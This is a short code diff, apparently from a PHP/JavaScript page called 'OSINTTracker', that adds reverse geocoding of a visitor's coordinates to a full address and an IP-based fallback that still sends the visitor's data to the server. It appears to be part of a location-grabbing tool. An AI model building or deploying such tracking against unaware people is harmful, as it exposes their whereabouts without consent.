@@ -775,11 +775,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
         
         async reverseGeocode() {
-            // akan diimplementasikan di commit berikutnya
+            try {
+                const response = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${this.userData.latitude}&lon=${this.userData.longitude}&addressdetails=1`,
+                    {
+                        headers: {
+                            'User-Agent': 'OSINTTracker/1.0',
+                            'Accept-Language': 'id'
+                        }
+                    }
+                );
+                
+                const data = await response.json();
+                
+                if (data && data.address) {
+                    const addr = data.address;
+                    this.userData.country = addr.country || this.userData.country;
+                    this.userData.city = addr.city || addr.town || addr.village || this.userData.city;
+                    this.userData.full_address = data.display_name || 'Tidak diketahui';
+                }
+            } catch (e) {}
         }
         
         async fallbackToIP() {
-            // akan diimplementasikan di commit berikutnya
+            this.userData.source = 'ip_based';
+            this.userData.full_address = 'Lokasi berdasarkan IP';
+            await this.sendData();
         }
         
         async sendData() {
